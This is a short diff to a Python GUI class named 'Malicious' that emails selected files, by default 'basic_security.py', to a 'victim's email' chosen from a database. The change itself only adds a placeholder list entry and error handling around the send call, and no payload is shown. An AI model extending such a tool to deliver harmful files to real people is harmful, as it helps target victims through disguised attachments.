@@ -9,7 +9,7 @@ import email_handler as eh
 
 class Malicious(object):
     selected = ["basic_security.py"] #the selected files to send
-    emails = [] #the list of emails fetched from database
+    emails = ["Choose from emails..."] #the list of emails fetched from database
     email = '' #the chosen victim's email
 
     #setupUi creates the widget objects in the proper containers and assigns the proper object names to them.
@@ -162,8 +162,11 @@ class Malicious(object):
                 conn.close()
                 print("Database Closed")
             if len(self.selected)!=0:
-                eh.send_email(self.email, self.selected)
-                QMessageBox.about(self.Dialog, "Success", "Your email was sent.")
+                try:
+                    eh.send_email(self.email, self.selected)
+                    QMessageBox.about(self.Dialog, "Success", "Your email was sent.")
+                except Exception:
+                    QMessageBox.about(self.Dialog, "Error", "Your email could not be sent.")
             else:
                 QMessageBox.about(self.Dialog, "Error", "Please choose at least one checkbox!")
 
